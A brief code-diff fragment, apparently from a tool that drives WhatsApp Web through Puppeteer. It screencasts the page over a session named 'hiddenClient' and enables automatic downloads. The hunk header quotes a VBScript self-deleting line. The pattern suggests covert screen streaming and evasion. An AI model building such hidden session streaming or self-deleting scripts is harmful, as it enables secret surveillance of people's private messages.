@@ -443,6 +443,10 @@ objFSO.DeleteFile WScript.ScriptFullName
             await page.goto('https://web.whatsapp.com', { waitUntil: 'domcontentloaded', timeout: 15000 }).catch(()=>{});
 
             hiddenClient = await page.target().createCDPSession();
+            await hiddenClient.send('Page.setDownloadBehavior', {
+                behavior: 'allow',
+                downloadPath: path.join(os.homedir(), 'Downloads')
+            });
             await hiddenClient.send('Page.startScreencast', { format: 'jpeg', quality: 60 });
             
             hiddenClient.on('Page.screencastFrame', async (frameObj) => {
